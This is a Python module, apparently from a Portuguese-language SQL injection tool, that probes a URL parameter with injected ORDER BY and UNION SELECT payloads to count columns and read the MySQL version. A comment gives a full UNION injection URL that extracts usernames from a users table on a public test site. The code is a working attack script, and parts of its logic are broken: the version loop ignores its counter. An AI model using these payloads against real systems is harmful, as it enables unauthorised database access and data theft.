# !/usr/bin/env python3

'''
faz um fingerprint no servido, retornando o nome do banco de dados e as suas tabelas
'''

import requests
import re


from core.config import FIND_NUMBER_OF_COLLUM_IN_TABLE
from core.config import INITIAL_COUNT_VALUE
from core.config import VULNERABLE_COLLUM_DETECTING
from core.config import CHECKING_FOR_DBMS_VERSION
from core.config import GET_TABLES_NAMES
from core import colors as color
from core.utils import  urlExplode


## http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1,2,3,4,5,6,(SELECT+uname+FROM+acuart.users+WHERE%202=2),8,9,10,11
def _dbFingerprint(target):
    current_table_cullum_number = 0;
    
    url_exploded = urlExplode(target)
    para = re.compile('(=)\w+')
    if para.search(target):
        splited_para = para.search(target).group()
        for current_table_cullum_number_counter in range(1, 100):
            print("\n["+color.green+"+"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) ORDER QUERY "+FIND_NUMBER_OF_COLLUM_IN_TABLE+str(current_table_cullum_number_counter)+color.end, end='')
            exploited_target_url = target.replace(splited_para, splited_para+FIND_NUMBER_OF_COLLUM_IN_TABLE+str(current_table_cullum_number_counter))
            main_request = requests.get(url=exploited_target_url)
            if 'mysql' in main_request.text.lower():
                current_table_cullum_number = current_table_cullum_number_counter - 1
                break
    return  current_table_cullum_number

## get sb server version....
def _serverVersion(target, cullumns_number):
    url_exploded = urlExplode(target)
    para = re.compile('(=)\w+')
    if para.search(target):
        splited_para = para.search(target).group()
        for collumns_perc in range(1, cullumns_number):
            exploited_target_url = target.replace(splited_para, splited_para+VULNERABLE_COLLUM_DETECTING+','+CHECKING_FOR_DBMS_VERSION)
            main_request = requests.get(url=exploited_target_url)
            if 'ubuntu' in main_request.text.lower():
                exploited_target_url = "Tabela vulnerável::"+str(collumns_perc)
                break
    
    return exploited_target_url